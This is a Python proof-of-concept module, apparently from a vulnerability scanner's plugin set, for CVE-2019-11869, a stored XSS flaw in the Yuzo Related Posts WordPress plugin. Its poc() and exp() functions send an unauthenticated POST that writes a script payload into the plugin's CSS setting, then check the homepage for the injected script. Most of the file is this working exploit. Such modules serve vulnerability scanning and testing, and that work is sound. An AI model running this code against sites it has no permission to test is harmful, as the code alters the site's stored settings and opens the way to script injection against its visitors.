import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Yuzo Related Posts plugin XSS''',
        "description": '''The Yuzo Related Posts plugin before 5.12.94 for WordPress has XSS
because it mistakenly expects that is_admin() verifies that the
request comes from an admin user (it actually only verifies that the
request is for an admin page). An unauthenticated attacker can inject
a payload into the plugin settings, such as the
yuzo_related_post_css_and_style setting.''',
        "severity": "medium",
        "references": [
            "https://www.wordfence.com/blog/2019/04/yuzo-related-posts-zero-day-vulnerability-exploited-in-the-wild", 
            "https://wpscan.com/vulnerability/9254"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2019-11869",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2019", "wordpress", "wp-plugin", "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-admin/options-general.php?page=yuzo-related-post"""
        method = "POST"
        data = """yuzo_related_post_css_and_style=</style><script>alert(0);</script>"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if "<script>alert(0);</script>" in resp1.text and "text/html" in str(resp1.headers).lower():
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url